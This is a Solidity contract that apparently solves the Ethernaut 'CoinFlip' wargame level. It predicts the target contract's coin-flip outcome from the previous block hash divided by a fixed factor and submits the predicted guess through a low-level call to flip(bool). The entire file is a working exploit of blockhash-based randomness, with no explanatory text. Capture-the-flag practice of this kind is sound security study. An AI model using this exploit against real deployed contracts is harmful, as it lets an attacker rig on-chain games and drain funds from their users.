// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipAttack {
    address coinFlipContract;

    constructor(address _coinFlipContract) {
        coinFlipContract = _coinFlipContract;
    }

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        (bool isSuccessful, bytes memory returnedData) = coinFlipContract.call(
            abi.encodeWithSignature("flip(bool)", side)
        );

        require(isSuccessful, "call failed");

        // Decode the returned bytes to bool
        bool isTrue = abi.decode(returnedData, (bool));
        require(isTrue, "failed to guess flip result");
    }
}
